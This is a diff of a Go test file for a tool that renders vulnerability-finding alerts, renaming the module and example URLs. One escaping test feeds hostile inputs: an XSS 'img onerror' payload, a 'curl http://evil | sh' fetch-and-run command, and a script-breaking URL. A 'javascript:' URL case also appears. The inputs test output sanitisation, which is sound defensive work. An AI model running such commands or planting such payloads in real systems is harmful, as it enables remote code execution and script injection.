@@ -5,7 +5,7 @@ import (
 	"strings"
 	"testing"
 
-	"github.com/DonSosiska/panoptes/internal/model"
+	"github.com/DonSosiska/holealign/internal/model"
 )
 
 func fullExploitable() model.Event {
@@ -35,7 +35,7 @@ func fullExploitable() model.Event {
 			Fix:         model.Fix{Upgrade: "upgrade openssl", Mitigation: "disable the heartbeat extension"},
 		},
 		FixCmd: "apt-get install --only-upgrade openssl",
-		WebURL: "https://panoptes.example/findings/7",
+		WebURL: "https://holealign.example/findings/7",
 	}
 }
 
@@ -62,7 +62,7 @@ func TestRenderExploitableFull(t *testing.T) {
 		"Rule: Heartbeat parsing overflow — Only reachable when TLS is terminated locally.",
 		"Fix: apt-get install --only-upgrade openssl",
 		"Mitigation: disable the heartbeat extension",
-		"Details: https://panoptes.example/findings/7",
+		"Details: https://holealign.example/findings/7",
 	}
 	for _, w := range wantLines {
 		if !hasLine(plain, w) {
@@ -76,7 +76,7 @@ func TestRenderExploitableFull(t *testing.T) {
 	for _, w := range []string{
 		"🔴 <b>EXPLOITABLE: CVE-2024-1234 on web01</b>",
 		"<code>apt-get install --only-upgrade openssl</code>",
-		`<a href="https://panoptes.example/findings/7">`,
+		`<a href="https://holealign.example/findings/7">`,
 	} {
 		if !strings.Contains(h, w) {
 			t.Errorf("formatted body missing %q\n%s", w, h)
@@ -122,7 +122,7 @@ func TestRenderEscapesHostileValues(t *testing.T) {
 	ev.Host.Hostname = `<img src=x onerror=alert(1)>`
 	ev.Rule.Title = "<i>title</i>"
 	ev.FixCmd = "curl http://evil | sh && echo <x>"
-	ev.WebURL = `https://panoptes.example/f?a="><script>`
+	ev.WebURL = `https://holealign.example/f?a="><script>`
 
 	plain, h := renderEvent(ev)
 
@@ -220,7 +220,7 @@ func TestRenderSummaryCapsLines(t *testing.T) {
 	for i := range 55 {
 		rest = append(rest, group{evs: []model.Event{testEvent(model.EventExploitable, fmt.Sprintf("CVE-%d", i), "web01")}})
 	}
-	m := renderSummary(rest, "https://panoptes.example/findings")
+	m := renderSummary(rest, "https://holealign.example/findings")
 	if !strings.HasPrefix(m.Body, "…and 55 more findings\n") {
 		t.Errorf("header = %q", lines(m.Body)[0])
 	}
@@ -234,7 +234,7 @@ func TestRenderSummaryCapsLines(t *testing.T) {
 	if !strings.Contains(m.Body, "• CVE-0@web01") {
 		t.Errorf("first item missing:\n%s", m.Body)
 	}
-	if !strings.HasSuffix(m.Body, "All findings: https://panoptes.example/findings") {
+	if !strings.HasSuffix(m.Body, "All findings: https://holealign.example/findings") {
 		t.Errorf("missing link:\n%s", m.Body)
 	}
 }
@@ -252,11 +252,11 @@ func TestRenderSummaryEscapesHost(t *testing.T) {
 
 func TestFindingsURL(t *testing.T) {
 	cases := map[string]string{
-		"https://panoptes.example/findings/7": "https://panoptes.example/findings",
-		"https://panoptes.example/x/y":        "https://panoptes.example/x/y/findings",
-		"http://10.0.0.1:8080/findings":       "http://10.0.0.1:8080/findings",
-		"":                                    "",
-		"javascript:alert(1)":                 "",
+		"https://holealign.example/findings/7": "https://holealign.example/findings",
+		"https://holealign.example/x/y":        "https://holealign.example/x/y/findings",
+		"http://10.0.0.1:8080/findings":        "http://10.0.0.1:8080/findings",
+		"":                                     "",
+		"javascript:alert(1)":                  "",
 	}
 	for in, want := range cases {
 		if got := findingsURL(in); got != want {
